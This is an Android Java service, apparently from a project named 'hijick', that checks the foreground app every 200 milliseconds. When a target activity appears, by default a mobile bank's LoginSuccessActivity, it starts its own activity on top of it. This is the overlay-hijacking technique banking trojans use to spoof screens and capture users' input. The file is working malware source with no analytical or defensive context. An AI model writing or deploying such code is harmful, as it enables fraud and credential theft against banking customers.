package cn.qssq666.hijick;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

public class LogObserverService extends Service {
    private static String logStr = "cn.comb.mobilebank.per.activity.account.LoginSuccessActivity";
    AlarmManager alarm;
    private BroadcastReceiver recevier = new LogObserverService1(this);
    PendingIntent sender;

    class LogObserverService1 extends BroadcastReceiver {
        LogObserverService1(LogObserverService arg1) {
        }

        public void onReceive(Context context, Intent arg8) {
            ComponentName v1 = ((RunningTaskInfo) ((ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE)).getRunningTasks(2).get(0)).topActivity;
            Log.e("vivi", v1.getClassName());
            if (v1.getClassName().contains(PreferencesUtils.getPreferences(LogObserverService.this, "activity"))) {
                Intent intent = new Intent(LogObserverService.this, UninstallActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                LogObserverService.this.startActivity(intent);
            }
        }
    }

    private void closeHeart() {
        if (this.alarm != null && this.sender != null) {
            this.alarm.cancel(this.sender);
            this.alarm = null;
        }
    }

    public IBinder onBind(Intent arg2) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        register();
    }

    public void onDestroy() {
        super.onDestroy();
        closeHeart();
        unRegister();
    }

    private void register() {
        IntentFilter v0 = new IntentFilter();
        v0.addAction("lunxun");
        registerReceiver(this.recevier, v0);
        sendHeart();
    }

    private void sendHeart() {
        if (this.alarm == null) {
            this.sender = PendingIntent.getBroadcast(this, 0, new Intent("lunxun"), 0);
            long v2 = SystemClock.elapsedRealtime();
            this.alarm = (AlarmManager) getSystemService("alarm");
            this.alarm.setRepeating(2, v2, 200, this.sender);
        }
    }

    private void unRegister() {
        unregisterReceiver(this.recevier);
    }
}